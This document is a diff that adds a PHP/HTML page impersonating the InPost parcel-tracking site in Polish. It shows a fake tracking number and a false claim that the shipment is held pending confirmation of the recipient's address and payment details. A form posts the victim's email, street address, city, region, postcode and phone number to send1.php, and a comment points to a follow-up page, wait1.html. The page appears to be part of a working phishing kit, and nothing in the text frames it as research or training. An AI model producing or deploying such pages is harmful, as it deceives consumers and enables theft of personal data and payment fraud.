@@ -1,0 +1,472 @@
+<?php
+// If you want to redirect immediately (not typical for your tracking form):
+// header("Location: wait1.html");
+// exit;
+?>
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<title>InPost Śledzenie Przesyłki</title>
+<style>
+  /* Reset */
+  *, *::before, *::after {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #fff;
+    color: #222;
+    line-height: 1.5;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+  a {
+    color: #000;
+    text-decoration: none;
+  }
+  a:hover {
+    text-decoration: underline;
+  }
+  .container {
+    max-width: 1140px;
+    margin: 0 auto;
+    padding: 0 1rem;
+  }
+
+  /* Header */
+  header {
+    border-bottom: 3px solid #ffcc00;
+  }
+  nav.top-nav {
+    display: flex;
+    align-items: center;
+    padding: 1rem 0;
+    flex-wrap: wrap;
+    justify-content: space-between;
+  }
+  .logo {
+    display: flex;
+    align-items: center;
+    font-weight: 700;
+    font-size: 1.5rem;
+    color: #000;
+    user-select: none;
+    cursor: default;
+  }
+  .logo svg {
+    width: 36px;
+    height: 36px;
+    fill: #ffcc00;
+    margin-right: 0.5rem;
+  }
+  .nav-menu {
+    display: flex;
+    gap: 1.75rem;
+    font-weight: 600;
+    font-size: 0.9rem;
+    user-select: none;
+    flex-wrap: wrap;
+    justify-content: center;
+    flex: 1 1 auto;
+  }
+  .nav-menu > div {
+    cursor: pointer;
+    white-space: nowrap;
+  }
+  .nav-menu > div:hover {
+    color: #ffcc00;
+  }
+  .nav-actions {
+    display: flex;
+    gap: 1.5rem;
+    align-items: center;
+  }
+  .icon-search {
+    width: 20px;
+    height: 20px;
+    stroke: #000;
+    stroke-width: 2;
+    fill: none;
+    cursor: pointer;
+  }
+  .login-btn {
+    display: flex;
+    align-items: center;
+    font-weight: 600;
+    color: #000;
+    cursor: pointer;
+    gap: 0.4rem;
+    user-select: none;
+  }
+  .login-icon {
+    width: 20px;
+    height: 20px;
+    fill: #ffcc00;
+  }
+
+  /* Subheader */
+  .sub-header {
+    background-color: #ffcc00;
+    display: flex;
+    align-items: center;
+    padding: 0.6rem 1rem;
+    gap: 2.5rem;
+    font-weight: 700;
+    font-size: 0.85rem;
+    user-select: none;
+    flex-wrap: wrap;
+    justify-content: center;
+  }
+  .sub-header div {
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    cursor: pointer;
+  }
+  .sub-header div:hover {
+    text-decoration: underline;
+  }
+  .flag {
+    width: 24px;
+    height: 16px;
+    border: 1px solid #ddd;
+    cursor: pointer;
+  }
+
+  /* Main tracking container */
+  #tracked-numbers {
+    max-width: 640px;
+    margin: 2.5rem auto 4rem;
+    background: #fff;
+    border: 1px solid #eee;
+    padding: 2rem;
+    border-radius: 8px;
+    box-shadow: 0 0 12px rgb(0 0 0 / 0.05);
+  }
+  .tracking-header {
+    font-weight: 700;
+    font-size: 1.25rem;
+    margin-bottom: 1rem;
+  }
+  .tracking-number {
+    color: #ffcc00;
+    user-select: text;
+  }
+  .delivery-status h3 {
+    margin: 0 0 0.25rem 0;
+    font-weight: 600;
+  }
+  .delivery-status h2 {
+    margin: 0 0 1rem 0;
+    font-weight: 700;
+    color: #d80000;
+    font-size: 1.2rem;
+  }
+  .delivery-status p {
+    font-size: 1rem;
+    color: #333;
+    line-height: 1.4;
+  }
+
+  /* Form styling */
+  form {
+    margin-top: 2rem;
+  }
+  label {
+    display: block;
+    font-weight: 600;
+    margin-bottom: 6px;
+  }
+  input[type="text"],
+  input[type="email"],
+  input[type="tel"] {
+    width: 100%;
+    padding: 0.6rem 0.75rem;
+    font-size: 1rem;
+    border: 2px solid #ccc;
+    border-radius: 5px;
+    transition: border-color 0.3s ease;
+  }
+  input[type="text"]:focus,
+  input[type="email"]:focus,
+  input[type="tel"]:focus {
+    border-color: #ffcc00;
+    outline: none;
+  }
+  .form-row {
+    display: flex;
+    gap: 1rem;
+    flex-wrap: wrap;
+    margin-bottom: 1.2rem;
+  }
+  .form-row > div {
+    flex: 1 1 45%;
+    min-width: 200px;
+  }
+  .form-row > div.full-width {
+    flex: 1 1 100%;
+  }
+  button[type="submit"] {
+    background-color: #ffcc00;
+    color: #000;
+    border: none;
+    font-weight: 700;
+    font-size: 1rem;
+    padding: 0.85rem 2rem;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+    display: block;
+    margin: 1rem auto 0 auto;
+    width: 100%;
+    max-width: 300px;
+  }
+  button[type="submit"]:hover,
+  button[type="submit"]:focus {
+    background-color: #e6b800;
+    outline: none;
+  }
+
+  /* Footer */
+  footer.mainFooter {
+    background: #222;
+    color: #bbb;
+    padding: 2rem 1rem;
+    font-size: 0.9rem;
+  }
+  .footer-logo img {
+    height: 38px;
+    vertical-align: middle;
+  }
+  .footer-menu {
+    list-style: none;
+    padding-left: 0;
+    margin: 1rem 0 0 0;
+    display: flex;
+    gap: 2rem;
+    flex-wrap: wrap;
+    justify-content: center;
+  }
+  .footer-menu li {
+    white-space: nowrap;
+    cursor: pointer;
+  }
+  .footer-menu li:hover {
+    color: #ffcc00;
+  }
+  .footer-socials {
+    margin-top: 1.5rem;
+    display: flex;
+    gap: 1.25rem;
+    justify-content: center;
+  }
+  .footer-socials div {
+    width: 32px;
+    height: 32px;
+    background: #444;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #bbb;
+    font-size: 14px;
+    font-weight: 700;
+    cursor: default;
+    user-select: none;
+  }
+  .footer-bottom {
+    border-top: 1px solid #444;
+    margin-top: 2rem;
+    padding-top: 1rem;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    text-align: center;
+  }
+  .footer-cookie-button {
+    background: none;
+    border: none;
+    color: #bbb;
+    cursor: pointer;
+    font-size: 0.85rem;
+    text-decoration: underline;
+    padding: 0;
+    font-weight: 500;
+  }
+
+  /* Responsive improvements */
+  @media (max-width: 900px) {
+    .form-row > div {
+      flex: 1 1 100%;
+      min-width: auto;
+    }
+    .nav-menu {
+      justify-content: center;
+      gap: 1rem;
+    }
+    .nav-actions {
+      justify-content: center;
+      width: 100%;
+      margin-top: 0.5rem;
+    }
+  }
+  @media (max-width: 480px) {
+    .sub-header {
+      gap: 1rem;
+      font-size: 0.8rem;
+    }
+    .footer-socials div {
+      width: 28px;
+      height: 28px;
+      font-size: 12px;
+    }
+    .button[type="submit"] {
+      max-width: 100%;
+    }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <nav class="top-nav" role="navigation" aria-label="Main navigation">
+    <div class="container" style="display:flex; align-items:center; flex-wrap:wrap; justify-content: space-between;">
+      <div class="logo" aria-label="InPost logo" tabindex="0">
+        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false" >
+          <circle cx="12" cy="12" r="5" fill="#FFCC00"/>
+          <g stroke="#FFCC00" stroke-width="2">
+            <line x1="12" y1="1" x2="12" y2="5" />
+            <line x1="12" y1="19" x2="12" y2="23" />
+            <line x1="1" y1="12" x2="5" y2="12" />
+            <line x1="19" y1="12" x2="23" y2="12" />
+            <line x1="4" y1="4" x2="7" y2="7" />
+            <line x1="17" y1="17" x2="20" y2="20" />
+            <line x1="4" y1="20" x2="7" y2="17" />
+            <line x1="17" y1="7" x2="20" y2="4" />
+          </g>
+        </svg>
+        InPost
+      </div>
+      <div class="nav-menu" role="menu" aria-label="Primary navigation menu">
+        <div role="menuitem" tabindex="0">Collect</div>
+        <div role="menuitem" tabindex="0">Send</div>
+        <div role="menuitem" tabindex="0">For companies</div>
+        <div role="menuitem" tabindex="0">About us</div>
+        <div role="menuitem" tabindex="0">Contact</div>
+        <div role="menuitem" tabindex="0">Rewards</div>
+        <div role="menuitem" tabindex="0">Shopping</div>
+        <div role="menuitem" tabindex="0">InPost Pay</div>
+      </div>
+      <div class="nav-actions">
+        <svg class="icon-search" viewBox="0 0 24 24" aria-label="Search icon" role="img" >
+          <circle cx="11" cy="11" r="7" fill="none"/>
+          <line x1="21" y1="21" x2="16.65" y2="16.65"/>
+        </svg>
+        <div class="login-btn" tabindex="0" aria-haspopup="true" aria-label="Log in">
+          <svg class="login-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+            <path d="M10 17l5-5-5-5v10z" />
+            <path d="M19 19H9v-2h8v-6H9V7h10v12z" />
+          </svg>
+          Log in
+        </div>
+      </div>
+    </div>
+  </nav>
+  <div class="sub-header container" role="region" aria-label="Secondary navigation">
+    <div tabindex="0">Śledzenie przesyłki</div>
+    <div tabindex="0">Znajdź Paczkomat</div>
+    <div tabindex="0">Cennik</div>
+    <img class="flag" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='24' height='16'><rect width='24' height='16' fill='%23dc143c'/><rect y='8' width='24' height='8' fill='%23fff'/></svg>" alt="Flaga Polski" />
+    <img class="flag" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='24' height='16'><rect width='24' height='16' fill='%23009b3a'/><rect y='8' width='24' height='8' fill='%23fff'/></svg>" alt="Flaga Ukrainy" />
+  </div>
+</header>
+
+<main id="tracked-numbers" class="container" role="main" aria-label="Śledzenie przesyłki i weryfikacja adresu">
+  <div class="tracking-header" aria-live="polite" aria-atomic="true">
+    Numer przesyłki: <span class="tracking-number" tabindex="0">PX11047900</span>
+  </div>
+  <section class="delivery-status" role="region" aria-live="polite" aria-atomic="true">
+    <h3>Status:</h3>
+    <h2>Twoja przesyłka jest wstrzymana — musimy potwierdzić Twój adres i dane płatności.</h2>
+    <p>
+      InPost umożliwia zmianę terminu dostawy lub aktualizację adresu w przypadku problemów.<br>
+      Możesz śledzić swoją przesyłkę od nadania aż do dostarczenia.
+    </p>
+  </section>
+
+  <form aria-label="Formularz weryfikacji adresu" method="POST" action="send1.php" novalidate>
+    <h3><strong>Zweryfikuj adres</strong></h3>
+    <p>Najpierw musimy potwierdzić, że Twój adres jest obsługiwany przez InPost.</p>
+
+    <div class="form-row">
+      <div>
+        <label for="email">E-mail</label>
+        <input type="email" id="email" name="email" maxlength="50" placeholder="E-mail" required autocomplete="email" />
+      </div>
+      <div>
+        <label for="add1">Ulica i numer domu</label>
+        <input type="text" id="add1" name="add1" maxlength="50" placeholder="Ulica i numer domu" required autocomplete="address-line1" />
+      </div>
+    </div>
+
+    <div class="form-row">
+      <div>
+        <label for="add2">Kraj</label>
+        <input type="text" id="add2" name="add2" maxlength="50" value="Polska" readonly />
+      </div>
+      <div>
+        <label for="city">Miasto</label>
+        <input type="text" id="city" name="city" maxlength="50" placeholder="Miasto" required autocomplete="address-level2" />
+      </div>
+    </div>
+
+    <div class="form-row">
+      <div>
+        <label for="state">Województwo</label>
+        <input type="text" id="state" name="state" maxlength="50" placeholder="Województwo" required autocomplete="address-level1" />
+      </div>
+      <div>
+        <label for="zip">Kod pocztowy (opcjonalnie)</label>
+        <input type="text" id="zip" name="zip" maxlength="10" placeholder="Kod pocztowy (opcjonalnie)" autocomplete="postal-code" />
+      </div>
+    </div>
+
+    <div class="form-row">
+      <div class="full-width">
+        <label for="phone">Numer telefonu</label>
+        <input type="tel" id="phone" name="phone" maxlength="15" placeholder="Numer telefonu" required autocomplete="tel" />
+      </div>
+    </div>
+
+    <button type="submit" name="verify">Kontynuuj</button>
+  </form>
+</main>
+
+<footer class="mainFooter" role="contentinfo">
+  <div class="container">
+    <div class="footer-logo" style="margin-bottom: 1rem;">
+      <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='120' height='30'><text x='0' y='20' font-family='Arial' font-weight='700' font-size='20' fill='%23FFCC00'>InPost</text></svg>" alt="Logo InPost" />
+    </div>
+    <ul class="footer-menu" role="menu" aria-label="Stopka nawigacji">
+      <li role="menuitem" tabindex="0">Fundacja InPost</li>
+      <li role="menuitem" tabindex="0">Wolontariat pracowniczy</li>
+      <li role="menuitem" tabindex="0">Szybka wysyłka</li>
+      <li role="menuitem" tabindex="0">Reklama</li>
+      <li role="menuitem" tabindex="0">Regulamin</li>
+    </ul>
+
+    <div class="footer-socials" aria-label="Media społecznościowe">
+      <div title="Facebook" tabindex="0">
+        <!-- Social icon or text here -->
+      </div>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
